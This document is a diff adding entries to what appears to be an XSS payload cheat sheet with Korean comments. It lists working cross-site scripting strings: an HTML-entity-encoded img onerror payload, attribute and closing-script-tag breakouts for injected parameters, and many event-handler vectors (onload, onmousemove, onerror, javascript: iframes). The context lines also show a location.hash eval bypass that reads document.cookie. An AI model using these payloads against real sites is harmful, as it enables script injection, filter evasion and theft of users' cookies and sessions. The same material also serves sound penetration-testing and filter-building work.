@@ -17,6 +17,8 @@
 
 `/search.php?q=<script>alert%28%27test%27%29<%2Fscript>`
 
+`<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">`
+
 `/search.php?q=<img+src%3Dx+onerror%3D"%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041">`
 
 <!-- Unicode encoding -->
@@ -105,6 +107,37 @@
 
 <!-- location.hash를 통한 우회; 길이 검증이 존재할 때 -->
 `<img src onerror="eval(location.hash.slice(1))">#alert(document.cookie);`
+
+<!-- page 파라미터; <a href="$_GET['page']> -->
+`" onfocus=alert(1) autofocus "`
+
+<!-- <script>태그를 사용하는 곳에 </script> 태그로 닫고 HTML 태그와 이벤트핸들러를 통해 스크립트 실행 유도-->
+``</script><img src=x onerror=alert(1)><!--`
+
+---
+#### 이벤트핸들러
+
+<!-- onload 이벤트 -->
+`<body onload="alert('XSS')">`
+
+`<iframe src="about:blank" onload="alert('XSS')" width=0 height=0></iframe>`
+
+<!-- onmousemove 이벤트 -->
+`<body onmousemove="alert('XSS')">`
+
+`<audio src="x" onerror="alert('XSS')"></audio>`
+
+```
+<script>
+  setTimeout(function() { alert('XSS'); }, 1000);
+</script>
+```
+
+`<iframe src="javascript:alert('XSS')"></iframe>`
+
+`<object data="x" onerror="alert('XSS')"></object>`
+
+
 
 <!-- svg file -->
 ```svg
